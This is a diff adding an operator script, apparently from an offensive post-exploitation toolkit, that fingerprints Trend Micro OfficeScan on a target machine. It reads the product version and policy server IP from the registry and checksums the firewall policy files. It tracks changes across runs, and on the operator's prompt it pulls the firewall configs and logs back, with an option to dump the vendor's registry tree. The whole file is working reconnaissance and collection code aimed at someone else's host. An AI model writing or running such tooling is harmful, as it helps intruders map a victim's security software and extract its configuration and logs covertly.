@@ -1,0 +1,160 @@
+@include "PSPHelpers.epm";
+@include "PerlFunctions.epm";
+#The struct is defined in PSPHelpers.epm
+metaData @metaData;
+#initialize the struct
+init(@metaData);
+
+@echo off;
+string $version;
+string $srvip;
+string $configs;
+string $logpath;
+@metaData.$vendor = "TrendMicro";
+
+
+#Do we know what it is?
+	@record on;
+	if (`regquery -hive L -subkey "SOFTWARE\\TrendMicro\\PC-cillinNTCorp\\CurrentVersion\\Misc." -value ProgramVer`) {
+		@record off;
+		$version = GetCmdData("value_data");
+		officescan("$version",$srvip,$configs,$logpath);
+		@metaData.$product = "OfficeScan";
+		@metaData.$version = $version;
+		@metaData.$logFile = $logpath;
+		@metaData.$information = "ServerIP:$srvip,FWChecksum:$configs";
+	} else {
+		@metaData.$product = "Unknown";
+		@metaData.$version = "Unknown";
+		echo "Current Version: Unknown!";
+		if (prompt "Pull Trend Micro registry information?") {
+			`background regquery -hive L -subkey "software\\trendmicro" -recursive`;
+		} else {
+			echo "Please reconsider so we can fingerprint this...";
+		}
+	}
+	
+#Check to see if settings have changed
+	@record on;
+	if(@metaData.$history){
+		if(checkConfig("trendmicro:@metaData.$version@metaData.$information",@metaData)){
+			echo "\r\rNo change in PSP configs.\r\r";
+		}else{
+			echo "\r\r!!!Changed PSP configs since last time!!!\r\r";
+		}
+	} else {
+		createConfig("trendmicro:@metaData.$version@metaData.$information",@metaData);
+	}
+		
+
+#Write our stuff to disk
+	@record off;
+	if(writeMetaData(@metaData)) {
+		echo "Wrote meta data to disk";
+	} else {
+		echo "ERROR: Could not write meta data to disk.";
+	}
+	
+
+sub officescan(IN string $version, OUT string $serverip, OUT string $checksum, OUT string $trendpath)
+{	
+	
+	@record on;
+		ifnot (`regquery -hive L -subkey "SOFTWARE\\TrendMicro\\PC-cillinNTCorp\\CurrentVersion" -value Server`) {
+			echo "Cannot find their logging server!";
+		}
+	@record off;
+	$serverip = GetCmdData("value_data");
+	echo "\n";
+	echo "It appears they are running TrendMicro OfficeScan Version $version";
+	echo "Policy/Log Server IP: $serverip";
+	string $system32 = GetEnv("SYSPATH");
+	string $rootDrive = split(":",$system32);
+
+	@record on;
+		ifnot (`dir oscepfw* -path "$rootDrive:\\Program Files" -recursive`) {
+			echo "Cannot locate any firewall configs, perhaps the firewall is not installed?";
+			return false;
+		}
+	$trendpath = "NONE";
+	$trendpath = GetCmdData("path");
+
+
+	if (sizeof($trendpath) < 1) {
+		echo "\nCannot locate any firewall configs, perhaps the firewall is not installed?";
+		return true;
+	} else {
+		echo "\nFound config files! Using $trendpath";
+	}
+
+	@record on;
+	ifnot (`checksum -mask oscepfwpolicyset.dat -path "$trendpath[0]"`) {
+		echo "Could not find .dat files in $trendpath[0]";
+		return false;
+	}
+
+	@record off;
+	$checksum = GetCmdData("checksum_value");
+
+	@record on;
+	ifnot (`dir oscepfwpolicyset.dat -path "$trendpath[0]"`) {
+		echo "Could not find .dat files in $trendpath[0]";
+		return false;
+	}
+	@record off;
+	string $filename = GetCmdData("name");
+
+	@record on;
+	ifnot (`getdirectory -scripts`) {
+		echo "Couldn't get directory";
+		return false;
+	}
+	@record off;
+
+	if( prompt "\nWould you like to pull back the firewall configuration files now?\n") {
+		@echo on;
+		`get oscepfw*.dat -path "$trendpath[0]"`;
+		@echo off;
+	}
+	@echo on;
+	if(`dir pfwlog* -path "$trendpath[0]"`) {
+	echo "\n!!!Found firewall logs, are they recent?\n";
+		if( prompt "\nDo you want to pull back the log files?\n") {
+			@echo on;
+			`get pfwlog* -path "$trendpath[0]"`;
+			@echo off;
+		}
+	}
+}
+
+sub reg_query(IN string $subkey, IN string $search_values, OUT string $ret)
+{
+	string $values;
+	string $value;
+	string $value_data;
+	int $i=0;
+	int $j=0;
+	@record on;
+	if(`regquery -hive L -subkey $subkey`)
+	{
+		$values = GetCmdData("value");
+		$value_data = GetCmdData("value_data");
+		
+		foreach $value ($values)
+		{
+			string $search_value;
+			foreach $search_value ($search_values)
+			{
+				if($value == $search_value)
+				{
+					$ret[$j] = $value_data[$i];
+					$j++;
+				}
+			}
+			$i++;
+		}
+	} else {
+		return false;
+	}
+
+}
